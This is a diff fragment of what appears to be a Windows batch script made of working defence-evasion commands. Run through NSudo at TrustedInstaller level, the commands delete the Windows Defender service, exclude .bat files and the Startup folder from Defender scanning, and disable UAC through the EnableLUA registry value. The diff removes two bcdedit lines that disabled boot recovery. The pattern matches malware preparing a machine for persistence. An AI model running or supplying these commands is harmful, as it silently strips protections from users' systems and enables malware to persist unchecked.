@@ -56,10 +56,6 @@ NSudo -U:T -ShowWindowMode:Hide  sc delete  windefend
 
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
 
-NSudo -U:T -ShowWindowMode:Hide bcdedit /set {default} recoveryenabled No
-
-NSudo -U:T -ShowWindowMode:Hide bcdedit /set {default} bootstatuspolicy ignoreallfailures
-
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
 
 powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
